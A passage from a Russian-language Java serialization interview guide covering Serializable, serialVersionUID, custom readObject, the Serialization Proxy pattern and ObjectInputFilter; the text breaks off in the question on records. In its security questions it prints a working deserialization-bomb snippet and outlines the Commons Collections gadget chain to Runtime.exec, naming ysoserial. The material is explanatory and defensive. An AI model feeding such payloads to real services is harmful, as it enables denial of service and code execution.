---
title: "Вопросы на собеседовании: Java Serialization"
description: "Полное руководство по вопросам собеседования на тему сериализации в Java: Serializable, Externalizable, serialVersionUID, transient, custom serialization, serialization proxy pattern, безопасность десериализации, ObjectInputFilter, Jackson, Gson, Protobuf, Avro, Kryo, records, sealed classes."
tags:
  - interview
  - programming-languages
  - java-serialization-interview
type: "interview"
difficulty: "intermediate"
aliases:
  - "Вопросы на собеседовании"
  - "Java Serialization"
  - "Java Serialization interview"
  - "сериализация Java"
prerequisites: []
next: []
updated: "2026-05-14"
---
# Вопросы на собеседовании: `Java Serialization`

Полное руководство по вопросам собеседования на тему сериализации в `Java`. Охватывает стандартный механизм (`Serializable`, `Externalizable`), управление совместимостью (`serialVersionUID`), кастомную сериализацию, паттерн `Serialization Proxy`, безопасность десериализации, `ObjectInputFilter`, JSON-сериализацию (`Jackson`, `Gson`), сериализацию `record` и `sealed` классов, а также альтернативные форматы (`Protobuf`, `Avro`, `Kryo`).

## Полезные ссылки

### Официальная документация

- [Java Object Serialization Specification](https://docs.oracle.com/en/java/javase/17/docs/specs/serialization/index.html) — спецификация механизма сериализации
- [Serializable (Javadoc)](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Serializable.html) — документация маркерного интерфейса
- [ObjectInputFilter (Javadoc)](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) — фильтрация при десериализации
- [Jackson Documentation](https://github.com/FasterXML/jackson-docs) — документация Jackson
- [Protocol Buffers Language Guide](https://protobuf.dev/programming-guides/proto3/) — руководство по Protobuf

### Baeldung

- [Introduction to Java Serialization — Baeldung](https://www.baeldung.com/java-serialization) — основы сериализации: ObjectOutputStream, ObjectInputStream
- [Deserialization Vulnerabilities in Java — Baeldung](https://www.baeldung.com/java-deserialization-vulnerabilities) — уязвимости десериализации и защита
- [Intro to the Jackson ObjectMapper — Baeldung](https://www.baeldung.com/jackson-object-mapper-tutorial) — сериализация/десериализация JSON через Jackson
- [Different Serialization Approaches for Java — Baeldung](https://www.baeldung.com/java-serialization-approaches) — сравнение подходов: Java, JSON, Protobuf, Kryo

## Содержание

- [Полезные ссылки](#полезные-ссылки)
- [See also](#see-also)

**Основы: `Serializable`, `serialVersionUID`, `transient`**
- [Q1. (!) Что такое сериализация и зачем она нужна?](#q1--что-такое-сериализация-и-зачем-она-нужна)
- [Q2. (!) Что такое маркерный интерфейс `Serializable`?](#q2--что-такое-маркерный-интерфейс-serializable)
- [Q3. (!) Что такое `serialVersionUID` и когда его задавать?](#q3--что-такое-serialversionuid-и-когда-его-задавать)
- [Q4. Какие поля не сериализуются (`transient`, `static`)?](#q4-какие-поля-не-сериализуются-transient-static)
- [Q5. Что происходит с совместимостью при изменении класса между версиями?](#q5-что-происходит-с-совместимостью-при-изменении-класса-между-версиями)

**`Externalizable`, наследование, специальные методы**
- [Q6. (!) Что такое `Externalizable` и чем отличается от `Serializable`?](#q6--что-такое-externalizable-и-чем-отличается-от-serializable)
- [Q7. Как сериализуется наследование (родитель не `Serializable`)?](#q7-как-сериализуется-наследование-родитель-не-serializable)
- [Q8. Как сериализовать объект в файл и обратно?](#q8-как-сериализовать-объект-в-файл-и-обратно)
- [Q9. (!) Что такое `writeReplace` и `readResolve`?](#q9--что-такое-writereplace-и-readresolve)

**Кастомная сериализация: `writeObject`/`readObject`**
- [Q10. (!) Как использовать custom `writeObject`/`readObject`?](#q10--как-использовать-custom-writeobjectreadobject)
- [Q11. Как правильно валидировать данные в `readObject`?](#q11-как-правильно-валидировать-данные-в-readobject)
- [Q12. Как сериализовать `enum` в `Java`?](#q12-как-сериализовать-enum-в-java)

**Serialization Proxy Pattern**
- [Q13. (!) Что такое `Serialization Proxy Pattern` и зачем он нужен?](#q13--что-такое-serialization-proxy-pattern-и-зачем-он-нужен)
- [Q14. Какие плюсы и минусы у `Serialization Proxy Pattern`?](#q14-какие-плюсы-и-минусы-у-serialization-proxy-pattern)

**Безопасность десериализации**
- [Q15. (!) Какие риски безопасности у `Java Serialization`?](#q15--какие-риски-безопасности-у-java-serialization)
- [Q16. (!) Что такое gadget chain и как работают атаки десериализации?](#q16--что-такое-gadget-chain-и-как-работают-атаки-десериализации)
- [Q17. (!) Что такое `ObjectInputFilter` и как его настроить?](#q17--что-такое-objectinputfilter-и-как-его-настроить)
- [Q18. Как защитить приложение от атак десериализации?](#q18-как-защитить-приложение-от-атак-десериализации)

**Сериализация `record` и `sealed` классов**
- [Q19. (!) Как сериализуются `record` классы в `Java`?](#q19--как-сериализуются-record-классы-в-java)
- [Q20. Как работает сериализация с `sealed` классами?](#q20-как-работает-сериализация-с-sealed-классами)

**JSON-сериализация: `Jackson`, `Gson`**
- [Q21. (!) Как работает `Jackson` и его основные аннотации?](#q21--как-работает-jackson-и-его-основные-аннотации)
- [Q22. Чем `Jackson` отличается от `Gson`?](#q22-чем-jackson-отличается-от-gson)
- [Q23. Как обрабатывать полиморфизм при JSON-сериализации в `Jackson`?](#q23-как-обрабатывать-полиморфизм-при-json-сериализации-в-jackson)
- [Q24. Как настроить кастомный сериализатор/десериализатор в `Jackson`?](#q24-как-настроить-кастомный-сериализатордесериализатор-в-jackson)
- [Q25. Какие проблемы безопасности есть у JSON-десериализации?](#q25-какие-проблемы-безопасности-есть-у-json-десериализации)

**Альтернативные форматы: `Protobuf`, `Avro`, `Kryo`**
- [Q26. (!) Что такое `Protocol Buffers` и когда их использовать?](#q26--что-такое-protocol-buffers-и-когда-их-использовать)
- [Q27. Что такое `Apache Avro` и чем он отличается от `Protobuf`?](#q27-что-такое-apache-avro-и-чем-он-отличается-от-protobuf)
- [Q28. Что такое `Kryo` и когда его выбирают?](#q28-что-такое-kryo-и-когда-его-выбирают)
- [Q29. (!) Как выбрать формат сериализации для проекта?](#q29--как-выбрать-формат-сериализации-для-проекта)

**Сериализация в микросервисах**
- [Q30. (!) Почему в микросервисах обычно избегают `Java Serialization`?](#q30--почему-в-микросервисах-обычно-избегают-java-serialization)
- [Q31. Как организовать версионирование схем в микросервисной архитектуре?](#q31-как-организовать-версионирование-схем-в-микросервисной-архитектуре)
- [Q32. Как сериализация связана с паттернами обмена сообщениями?](#q32-как-сериализация-связана-с-паттернами-обмена-сообщениями)

**Безопасность и продвинутые механизмы**
- [Q33. (!) Десериализация как вектор атаки — OWASP и реальные эксплойты](#q33--десериализация-как-вектор-атаки--owasp-и-реальные-эксплойты)
- [Q34. (!) Как `readResolve()` обеспечивает Singleton при десериализации?](#q34--как-readresolve-обеспечивает-singleton-при-десериализации)
- [Q35. Что такое `serialPersistentFields` и когда его использовать?](#q35-что-такое-serialpersistentfields-и-когда-его-использовать)
- [Q36. Как сериализация работает с наследованием и `abstract class`?](#q36-как-сериализация-работает-с-наследованием-и-abstract-class)

**Сериализация в Spring и альтернативные фреймворки**
- [Q37. (!) Как Spring обрабатывает сериализацию через `HttpMessageConverter`?](#q37--как-spring-обрабатывает-сериализацию-через-httpmessageconverter)
- [Q38. (!) Jackson vs Gson — углублённое сравнение для Spring-проектов](#q38--jackson-vs-gson--углублённое-сравнение-для-spring-проектов)
- [Q39. FST — быстрый аналог Java Serialization](#q39-fst--быстрый-аналог-java-serialization)
- [Q40. Как сериализуются `Java Record` — детали механизма](#q40-как-сериализуются-java-record--детали-механизма)

---

## Q1. (!) Что такое сериализация и зачем она нужна?

**Сериализация** — это преобразование объекта в поток байтов (или в другой формат), чтобы его можно было сохранить на диск, передать по сети или положить в кэш. Обратный процесс восстановления объекта из потока называется **десериализацией**. В `Java` стандартный механизм — классы `ObjectOutputStream` и `ObjectInputStream`, работающие с бинарным форматом, специфичным для `JVM`.

Полный цикл выглядит так:

- `Java Object` → (через `ObjectOutputStream`) → `Byte Stream` (поток байтов);
- `Byte Stream` → (Файл / Сеть / Кэш) → Хранилище;
- Хранилище → (через `ObjectInputStream`) → снова `Java Object`.

Смысл прост: объект живёт в heap конкретной JVM, а байты можно положить куда угодно и восстановить позже. **Зачем это нужно:**
- **Персистентность** — сохранение состояния приложения (сессии, чекпоинты)
- **RMI** — удалённый вызов методов между JVM
- **Кэширование** — сохранение объектов в распределённых кэшах (`Redis`, `Hazelcast`)
- **Очереди сообщений** — передача объектов через [Kafka](../../messaging/kafka-interview.md), `RabbitMQ`

**Ключевой нюанс:** бинарная Java-сериализация привязана к платформе и к версии класса — её понимает только JVM с тем же `.class`. Поэтому для межсистемного обмена и современных сервисов чаще берут `JSON`, `XML` или `Protocol Buffers`: они кроссязычны, читаемы (кроме Protobuf) и не выполняют произвольный код при десериализации, то есть безопаснее.

## Q2. (!) Что такое маркерный интерфейс `Serializable`?

`Serializable` — маркерный интерфейс из `java.io` без единого метода: он только помечает класс как разрешённый к сериализации. Без него `ObjectOutputStream.writeObject()` бросит `NotSerializableException`. То есть интерфейс работает как «флаг разрешения», а не как контракт с методами.

**Что следует из этого правила:**
- Все подклассы сериализуемого класса автоматически тоже сериализуемы — флаг наследуется.
- Все поля ссылочных типов должны быть сериализуемы — иначе при записи всего графа объект упрётся в несериализуемое поле и упадёт.
- Несериализуемое поле либо помечают `transient` (его пропустят), либо восстанавливают вручную в `readObject` / `readResolve`.

```java
public class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private final String name;
    private final int age;
    private transient Logger log = LoggerFactory.getLogger(User.class); // не сериализуется

    public User(String name, int age) {
        this.name = name;
        this.age = age;
    }
}
// Без Serializable при writeObject(obj) — NotSerializableException
```

**Частый вопрос на собеседовании:** *«Почему `Serializable` — маркерный, без методов?»* Потому что стандартный механизм читает поля через рефлексию — ему не нужно, чтобы класс реализовывал какой-либо метод. Когда же нужен контроль над форматом, его добавляют точечно: приватными методами `writeObject`/`readObject` либо интерфейсом `Externalizable`.

## Q3. (!) Что такое `serialVersionUID` и когда его задавать?

`serialVersionUID` — это `long`-идентификатор версии сериализуемого класса, который записывается в поток. При десериализации JVM сверяет UID из потока с UID класса в текущей `JVM`; если они не совпадают — бросается `InvalidClassException`. По сути это «контрольная сумма версии класса».

**В чём подвох автоматического UID.** Если не задать `serialVersionUID` явно, `JVM` вычислит его сама — по хэшу сигнатур полей, методов, суперклассов и интерфейсов. Тогда любое изменение класса (вплоть до добавления `private`-метода) меняет UID, и ранее сохранённые данные внезапно перестают читаться. Явный UID отвязывает совместимость от случайных правок и оставляет её под вашим контролем.

```java
// Рекомендация: всегда задавать явно
private static final long serialVersionUID = 1L;
```

**Стратегия управления:**

| Изменение | Действие с `serialVersionUID` |
|-----------|-------------------------------|
| Добавление поля с default-значением | Оставить тем же |
| Добавление `transient` поля | Оставить тем же |
| Удаление поля | Осторожно — можно оставить, но данные потеряются |
| Смена типа поля | Изменить UID (несовместимое изменение) |
| Переименование поля | Изменить UID |

Joshua Bloch в *Effective Java* рекомендует **всегда** явно задавать `serialVersionUID` в каждом `Serializable`-классе.

## Q4. Какие поля не сериализуются (`transient`, `static`)?

Из потока выпадают два вида полей — и по разным причинам:
- **`transient`** — явно исключаются из сериализации. После десериализации получают значение по умолчанию: `null` для ссылок, `0` для чисел, `false` для `boolean`.
- **`static`** — не сериализуются потому, что принадлежат классу, а не экземпляру; в поток пишется состояние конкретного объекта, а не класса.

**Типичные кандидаты на `transient`** — то, что нельзя или незачем сохранять:
- Логгеры (`Logger`) — пересоздаются после загрузки
- Кэши и вычисляемые поля — легко пересчитать из основных данных
- Ресурсы (`Connection`, `Socket`, `InputStream`) — привязаны к текущему процессу, переносить бессмысленно
- Пароли и чувствительные данные — чтобы не утекли в файл/сеть

```java
public class CachedResult implements Serializable {
    private static final long serialVersionUID = 1L;
    private final String data;
    private transient volatile Object cache;       // не сериализуется → null
    private transient Logger log;                   // не сериализуется → null
    private static int instanceCount;               // не сериализуется (static)

    // восстанавливаем transient-поля после десериализации
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        this.cache = compute(data);
        this.log = LoggerFactory.getLogger(CachedResult.class);
    }
}
```

## Q5. Что происходит с совместимостью при изменении класса между версиями?

Коротко: пока `serialVersionUID` совпадает, старые байты читаются — но только если правки относятся к классу совместимых изменений. Несовместимые изменения нужно сопровождать сменой UID, иначе вы получите либо `InvalidClassException`, либо тихо повреждённый объект.

**Совместимые изменения** (старые данные читаются при том же UID):
- Добавление нового поля — при чтении старых данных оно получит значение по умолчанию
- Добавление методов `writeObject`/`readObject`
- Изменение модификатора доступа поля
- Добавление/удаление модификатора `transient`

**Несовместимые изменения** (требуют смены UID — иначе данные испортятся):
- Удаление поля (данные потеряны)
- Перемещение класса по иерархии наследования
- Смена типа примитивного поля (например, `int` → `long`)
- Замена `Serializable` на `Externalizable` и наоборот

Две типичные ветки эволюции класса `v1` с `serialVersionUID = 1L`:

- **Добавление поля** → `Класс v2` с тем же `serialVersionUID = 1L` — совместимо. При десериализации данных `v1` новое поле получает значение по умолчанию (`default`).
- **Смена типа поля** → `Класс v2` с `serialVersionUID = 2L` — несовместимо. При десериализации данных `v1` бросается `InvalidClassException`.

Для долгоживущих форматов рекомендуется переходить на форматы с явным версионированием схем (`Protobuf`, `Avro`), где эволюция модели управляется через схемы, а не через поведение `JVM`.

## Q6. (!) Что такое `Externalizable` и чем отличается от `Serializable`?

`Externalizable` — это `Serializable` с полным ручным контролем: вы расширяете его и реализуете `writeExternal(ObjectOutput out)` / `readExternal(ObjectInput in)`, где сами решаете, какие поля и в каком порядке писать и читать. JVM перестаёт делать что-либо за вас через рефлексию — формат целиком на вас. В обмен получаете меньший и более быстрый поток, но платите тем, что совместимость между версиями приходится поддерживать руками.

| Характеристика | `Serializable` | `Externalizable` |
|----------------|----------------|-------------------|
| Контроль | Автоматический (рефлексия) | Полный (ручной) |
| No-arg конструктор | Не требуется | **Обязателен** (public) |
| Производительность | Медленнее (рефлексия) | Быстрее |
| Размер потока | Больше (метаданные) | Меньше (только данные) |
| `transient` | Учитывается | Игнорируется (управление вручную) |
| Сложность | Низкая | Высокая |

```java
public class CompactDto implements Externalizable {
    private String name;
    private int id;

    public CompactDto() {}  // обязателен для десериализации

    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        out.writeUTF(name);
        out.writeInt(id);
    }

    @Override
    public void readExternal(ObjectInput in) throws IOException {
        name = in.readUTF();
        id = in.readInt();
    }
}
```

Из-за ручного поддержания совместимости `Externalizable` используют реже. В современных проектах для оптимизации размера и скорости обычно выбирают `Protobuf` или `Kryo`, а не `Externalizable`.

## Q7. Как сериализуется наследование (родитель не `Serializable`)?

Если родитель **не** `Serializable`, его поля в поток не попадают — сохраняются только поля потомка. А при десериализации состояние родителя восстанавливается не из потока, а через его **no-arg конструктор**, который JVM обязана вызвать. Отсюда жёсткое требование: у несериализуемого родителя должен быть доступный конструктор без аргументов, иначе будет `InvalidClassException`.

Иерархия по порядку:

- `Object` → (через no-arg конструктор) → `Parent` (не `Serializable`, его поля НЕ сохраняются);
- `Parent` → (`extends`) → `Child implements Serializable` (поля потомка сохраняются).

**Если же родитель сам `Serializable`**, его поля сериализуются вместе с потомком, и при десериализации восстанавливаются прямо из потока — обычные конструкторы при этом не вызываются вовсе. Именно поэтому правило про no-arg конструктор касается только несериализуемых родителей.

```java
class Animal {
    String species;
    Animal() { this.species = "unknown"; } // обязателен!
}

class Dog extends Animal implements Serializable {
    private static final long serialVersionUID = 1L;
    String name;
    // species НЕ сохранится при сериализации
    // после десериализации species = "unknown" (из конструктора Animal)
}
```

## Q8. Как сериализовать объект в файл и обратно?

Запись — через связку `FileOutputStream` + `ObjectOutputStream`, чтение — `FileInputStream` + `ObjectInputStream`. `ObjectOutputStream` оборачивает файловый поток и умеет писать целые графы объектов; `try-with-resources` гарантирует, что потоки закроются и буфер сбросится на диск.

```java
// Запись
try (var fos = new FileOutputStream("data.ser");
     var oos = new ObjectOutputStream(fos)) {
    oos.writeObject(user);
}

// Чтение
try (var fis = new FileInputStream("data.ser");
     var ois = new ObjectInputStream(fis)) {
    User user = (User) ois.readObject();
}
```

**Подводные камни:**
- `readObject()` возвращает `Object` — нужно приведение типа
- Обрабатывать `IOException` и `ClassNotFoundException` (класс может отсутствовать на стороне чтения)
- При записи нескольких объектов читать их строго в том же порядке — поток последовательный
- Большие графы объектов могут потребовать заметный объём памяти — весь граф материализуется целиком

## Q9. (!) Что такое `writeReplace` и `readResolve`?

Это парные хук-методы, которые позволяют подменить объект на границах сериализации — один на входе в поток, другой на выходе.

- **`writeReplace()`** вызывается **перед** записью: то, что он вернёт, сериализуется вместо исходного объекта. Так подменяют объект на прокси или компактный маркер.
- **`readResolve()`** вызывается **после** восстановления: его результат заменяет только что десериализованный объект. Классический случай — **синглтоны**: десериализация всегда создаёт новый экземпляр, а `readResolve()` отбрасывает его и возвращает единственный существующий.

Поток вызовов между участниками (`App`, `ObjectOutputStream` — OOS, `Byte Stream` — Stream, `ObjectInputStream` — OIS) по порядку:

1. `App` → OOS: `writeObject(obj)`.
2. OOS у себя: `obj.writeReplace()` → `proxy`.
3. OOS → Stream: `serialize(proxy)`.
4. Stream → OIS: `readObject()`.
5. OIS у себя: `deserialize` → `proxy`.
6. OIS у себя: `proxy.readResolve()` → `obj`.
7. OIS → `App`: `return obj`.

```java
public class Singleton implements Serializable {
    private static final long serialVersionUID = 1L;
    public static final Singleton INSTANCE = new Singleton();

    private Singleton() {}

    // при десериализации вернуть единственный экземпляр
    private Object readResolve() {
        return INSTANCE;
    }
}
```

Без `readResolve` десериализация синглтона создаст **второй экземпляр**, нарушив контракт единственности. Это одна из причин, почему `enum`-синглтоны считаются более надёжным подходом (см. [паттерны проектирования](../../design-patterns/design-patterns-interview.md)).

## Q10. (!) Как использовать custom `writeObject`/`readObject`?

Эти методы добавляют свою логику в стандартный механизм, не отказываясь от него полностью (как `Externalizable`): JVM сначала делает свою работу, а вы дописываете нужное вокруг. Их нельзя «объявить» — JVM ищет их рефлексией по **строго фиксированной сигнатуре**, поэтому даже опечатка в типе аргумента приведёт к тому, что метод тихо не вызовется.

```java
public class SecureData implements Serializable {
    private static final long serialVersionUID = 1L;
    private String publicData;
    private transient String sensitiveData;

    // Сигнатура ОБЯЗАТЕЛЬНА: private void writeObject(ObjectOutputStream)
    private void writeObject(ObjectOutputStream oos) throws IOException {
        oos.defaultWriteObject();              // записать все не-transient поля
        oos.writeObject(encrypt(sensitiveData)); // дополнительная логика
    }

    // Сигнатура ОБЯЗАТЕЛЬНА: private void readObject(ObjectInputStream)
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();               // прочитать все не-transient поля
        this.sensitiveData = decrypt((String) ois.readObject());
    }

    private String encrypt(String data) { /* ... */ return data; }
    private String decrypt(String data) { /* ... */ return data; }
}
```

**Ключевые правила:**
1. Вызывать `defaultWriteObject()`/`defaultReadObject()` **первыми** — JVM запишет/прочитает не-`transient` поля стандартно, и это сохранит совместимость при добавлении новых полей
2. Порядок записи и чтения дополнительных данных должен совпадать — поток последовательный
3. Методы должны быть `private` — иначе JVM их не найдёт и применит дефолтную логику
4. В `readObject` обязательно **валидировать** восстановленные данные — это фактически конструктор из недоверенных байтов (см. Q11)

## Q11. Как правильно валидировать данные в `readObject`?

**Главная идея:** `readObject` — это скрытый «публичный конструктор», который собирает объект из произвольных байтов в обход обычных конструкторов и их проверок. Если в нём не повторить инварианты, атакующий подсунет поток, создающий объект в заведомо невозможном состоянии (например, `start > end`). Поэтому валидацию из конструктора дублируют после `defaultReadObject()`.

```java
public class Period implements Serializable {
    private static final long serialVersionUID = 1L;
    private final Date start;
    private final Date end;

    public Period(Date start, Date end) {
        if (start.compareTo(end) > 0)
            throw new IllegalArgumentException("start > end");
        this.start = new Date(start.getTime()); // defensive copy
        this.end = new Date(end.getTime());
    }

    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();

        // 1. Валидация инвариантов — как в конструкторе!
        if (start.compareTo(end) > 0)
            throw new InvalidObjectException("start > end");

        // 2. Defensive copy мутабельных полей
        // (для final полей — через Serialization Proxy)
    }
}
```

Рекомендации Joshua Bloch (*Effective Java*, Item 88):
- Валидировать **все** инварианты после `defaultReadObject()`
- При нарушении бросать `InvalidObjectException`
- Делать defensive copy мутабельных полей
- Не вызывать переопределяемые методы в `readObject`

## Q12. Как сериализовать `enum` в `Java`?

Никак специально — `enum` сериализуется **по имени константы**, а не по полям. В поток уходит только строка-имя, а при чтении JVM вызывает `Enum.valueOf(класс, имя)` и возвращает ту же самую константу из класса. Поэтому идентичность сохраняется автоматически: `Status.ACTIVE` после round-trip остаётся тем же объектом.

```java
public enum Status { ACTIVE, INACTIVE }
// сериализуется как "ACTIVE" или "INACTIVE"
```

**Что отсюда следует:**
- Дополнительные поля константы **не записываются** — восстановится только то значение поля, что прописано в классе на стороне чтения
- Кастомная сериализация запрещена — `writeObject`/`readObject` у `enum` игнорируются
- Идентичность экземпляров гарантирована — в отличие от обычных классов, дубликата константы не возникнет
- Именно из-за этой гарантии `enum` — **лучший способ реализации синглтона** в `Java` (Effective Java, Item 3): защита от дублирования встроена в язык, `readResolve` писать не нужно

## Q13. (!) Что такое `Serialization Proxy Pattern` и зачем он нужен?

`Serialization Proxy Pattern` (Effective Java, Item 90) сериализует не сам объект, а маленький **приватный вложенный класс-прокси** с минимумом данных для восстановления. Идея: не пускать байты потока напрямую в объект, а заставить их пройти через обычный конструктор. Это одним приёмом снимает главные боли стандартной сериализации — обход проверок инвариантов, невозможность восстановить `final`-поля без рефлексии и уязвимость к подделке потока.

**Как устроено (4 шага в коде ниже):** `writeReplace()` отдаёт в поток прокси вместо объекта → `readObject()` основного класса запрещает прямую десериализацию → прокси хранит сырые данные → `readResolve()` прокси вызывает настоящий конструктор, где срабатывают валидация и defensive copy.

```java
public class Period implements Serializable {
    private final Date start;
    private final Date end;

    public Period(Date start, Date end) {
        if (start.compareTo(end) > 0)
            throw new IllegalArgumentException("start > end");
        this.start = new Date(start.getTime());
        this.end = new Date(end.getTime());
    }

    // 1. Подменяем объект на прокси перед сериализацией
    private Object writeReplace() {
        return new SerializationProxy(this);
    }

    // 2. Запрещаем прямую десериализацию основного класса
    private void readObject(ObjectInputStream stream)
            throws InvalidObjectException {
        throw new InvalidObjectException("Proxy required");
    }

    // 3. Приватный прокси с данными
    private static class SerializationProxy implements Serializable {
        private static final long serialVersionUID = 1L;
        private final Date start;
        private final Date end;

        SerializationProxy(Period p) {
            this.start = p.start;
            this.end = p.end;
        }

        // 4. Восстановление через обычный конструктор
        private Object readResolve() {
            return new Period(start, end); // валидация и defensive copy!
        }
    }
}
```

Поток вызовов между `Period` (Obj), `SerializationProxy` (Proxy) и `Byte Stream` (Stream) по порядку:

1. На стороне `Period` срабатывает `writeReplace()`.
2. `Period` → `SerializationProxy`: создать прокси с данными.
3. `SerializationProxy` → `Byte Stream`: сериализация прокси.
4. Далее — десериализация: `Byte Stream` → `SerializationProxy`: восстановить прокси.
5. На стороне `SerializationProxy` срабатывает `readResolve()`.
6. `SerializationProxy` → `Period`: `new Period(start, end)`.
7. В `Period` выполняется валидация в конструкторе.

## Q14. Какие плюсы и минусы у `Serialization Proxy Pattern`?

**Плюсы:**
- Объект восстанавливается через **обычный конструктор** — значит, проверяются все инварианты, бесплатно и без дублирования логики
- Работает с `final`-полями — конструктор присваивает их штатно, чего не умеет кастомный `readObject`
- Защищает от атак — прямая десериализация основного класса запрещена, мимо валидации не пройти
- Не зависит от внутренней структуры класса — поля можно менять, не ломая формат

**Минусы:**
- Несовместим с наследованием — у расширяемого класса прокси вернёт родительский тип
- Небольшой overhead по производительности (~14% по данным Bloch) — цена за лишний объект-прокси
- Не работает при циклических ссылках объекта на себя

**На собеседовании** упоминание этого паттерна — сильный сигнал: кандидат читал *Effective Java* и понимает компромиссы стандартной сериализации, а не просто помнит `implements Serializable`.

## Q15. (!) Какие риски безопасности у `Java Serialization`?

Десериализация недоверенного потока — одна из самых опасных операций в `Java`. Корень проблемы в том, что `readObject` исполняет код (конструкторы, статические блоки, `readObject` вложенных классов) ещё до того, как приложение увидит результат и сможет его проверить. Отсюда три класса рисков:

1. **Remote Code Execution (RCE)** — поток подобран так, чтобы при чтении сработала опасная цепочка вызовов в библиотеках classpath (gadget chain, см. Q16)
2. **Denial of Service (DoS)** — специально сконструированный поток вгоняет в бесконечный цикл, `OutOfMemoryError` или 100% CPU
3. **Нарушение инвариантов** — объект собирается в невозможном состоянии мимо конструкторов (см. Q11)

**Пример DoS** (так называемая *deserialization bomb*):

```java
// Создаёт объект, десериализация которого требует вычисления 2^100 хэшей
Set<Object> root = new HashSet<>();
Set<Object> s1 = root, s2 = new HashSet<>();
for (int i = 0; i < 100; i++) {
    Set<Object> t1 = new HashSet<>(), t2 = new HashSet<>();
    t1.add("foo"); // заставляет hashCode() вычисляться
    s1.add(t1); s1.add(t2);
    s2.add(t1); s2.add(t2);
    s1 = t1; s2 = t2;
}
```

Подробнее о [безопасности приложений](../../security/application-security-interview.md).

## Q16. (!) Что такое gadget chain и как работают атаки десериализации?

**Gadget chain** (цепочка гаджетов) — это последовательность вызовов уже существующих методов из библиотек на classpath, которая в итоге исполняет произвольный код. Хитрость в том, что атакующий не загружает свой класс: он лишь подбирает граф объектов из *чужих* классов так, чтобы их `readObject`, `hashCode`, `getValue` и т. п. вызывались каскадом и привели к `Runtime.exec`. Поэтому уязвимость определяется не вашим кодом, а тем, что лежит в зависимостях.

Типичная цепочка вызовов (на примере Apache Commons Collections), шаг за шагом:

- Вредоносный `byte stream` → (`readObject`) → `HashMap`;
- `HashMap` → (`hashCode`) → `TiedMapEntry`;
- `TiedMapEntry` → (`getValue`) → `LazyMap`;
- `LazyMap` → (`get` → `transform`) → `InvokerTransformer`;
- `InvokerTransformer` → (`invoke`) → `Runtime.exec` — выполнение произвольного кода.

**Известные источники gadget chains** (классы, которые служат «звеньями» в цепочках):
- **Apache Commons Collections** — `InvokerTransformer`, `ChainedTransformer`
- **Spring Framework** — `MethodInvokeTypeProvider`
- **Groovy** — `MethodClosure`
- **Commons BeanUtils** — `BeanComparator`

**Инструменты:** `ysoserial` генерирует готовые эксплойт-потоки под конкретную библиотеку, `GadgetInspector` статически ищет потенциальные цепочки в вашем classpath.

**Главный вывод:** никогда не десериализуйте данные из ненадёжных источников стандартным `ObjectInputStream` — наличие любой gadget-библиотеки в зависимостях превращает приём такого потока в RCE.

## Q17. (!) Что такое `ObjectInputFilter` и как его настроить?

`ObjectInputFilter` (появился в `Java` 9, бэкпорт в 8u121) — встроенный механизм фильтрации, который вызывается на каждый класс и каждую ссылку *до* их материализации. Это позволяет отсечь опасный поток ещё до того, как сработает чей-то `readObject`. Фильтр решает две задачи: разрешить только нужные классы (белый список) и ограничить сложность графа (глубину, число ссылок, размер) — то есть бьёт сразу по RCE и по DoS.

```java
// Вариант 1: Фильтр через паттерн
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;!*"  // разрешить только классы из com.example.dto
);

try (var ois = new ObjectInputStream(inputStream)) {
    ois.setObjectInputFilter(filter);
    var obj = ois.readObject();
}

// Вариант 2: Программный фильтр
ObjectInputFilter programFilter = info -> {
    if (info.serialClass() != null) {
        String name = info.serialClass().getName();
        if (!name.startsWith("com.example.dto.")) {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    if (info.depth() > 10) return ObjectInputFilter.Status.REJECTED;
    if (info.references() > 1000) return ObjectInputFilter.Status.REJECTED;
    return ObjectInputFilter.Status.ALLOWED;
};
```

**Глобальная настройка** через системное свойство (рекомендуется для всего приложения):

```bash
-Djdk.serialFilter="com.example.dto.*;java.base/*;!*"
```

В `Java` 17+ появился **context-specific deserialization filter** (`ObjectInputFilter.Config.setSerialFilterFactory()`), позволяющий задавать фильтры на уровне фреймворка.

Ограничения фильтра:

| Параметр | Описание | Пример |
|----------|----------|--------|
| `maxdepth` | Глубина вложенности | `maxdepth=5` |
| `maxrefs` | Число ссылок | `maxrefs=100` |
| `maxbytes` | Размер потока | `maxbytes=1000000` |
| `maxarray` | Размер массива | `maxarray=10000` |

## Q18. Как защитить приложение от атак десериализации?

Защита строится слоями — от «вообще не подставляться» до контроля в рантайме, по убыванию надёжности:

1. **Не использовать Java Serialization** для данных извне — лучшая защита, формат проблему не порождает (предпочесть JSON/Protobuf)
2. **`ObjectInputFilter`** — если без десериализации никак, поставить белый список классов и лимиты графа
3. **Serialization Proxy Pattern** — исключает прямую десериализацию основного класса (см. Q13)
4. **Обновлять зависимости** — убирать из classpath известные gadget-библиотеки старых версий
5. **Мониторинг** — логировать десериализацию через JFR (Java Flight Recorder), чтобы видеть подозрительные классы
6. **RASP/WAF** — runtime-защита на уровне инфраструктуры как последний рубеж

Алгоритм решения для входящих данных по формату:

- **Формат JSON/Protobuf** → безопасный парсинг.
- **Формат Java Serialization** → смотрим на источник:
  - **Доверенный** → `ObjectInputFilter` + белый список;
  - **Недоверенный** → отклонить.

Подробнее о защите от OWASP-уязвимостей: [OWASP Top 10](../../security/owasp-top10-interview.md) (A8:2017 — Insecure Deserialization).

## Q19. (!) Как сериализуются `record` классы в `Java`?

`Record` (Java 16+) по умолчанию **не** `Serializable`; чтобы его сериализовать, нужно явно дописать `implements Serializable`. Главное отличие от обычных классов в том, как идёт **восстановление**: не рефлексией прямо в поля, а через канонический конструктор. Из этого вытекает всё остальное:

1. Сериализуются **только компоненты** record (поля из заголовка)
2. При десериализации вызывается **канонический конструктор** — а не запись в поля рефлексией
3. Кастомные `writeObject`/`readObject` **игнорируются** — формат фиксирован компонентами
4. `writeReplace`/`readResolve` при этом работают как обычно

```java
public record Point(int x, int y) implements Serializable {
    // serialVersionUID рекомендуется для стабильности
    @java.io.Serial
    private static final long serialVersionUID = 1L;

    // Канонический конструктор — вызывается при десериализации!
    public Point {
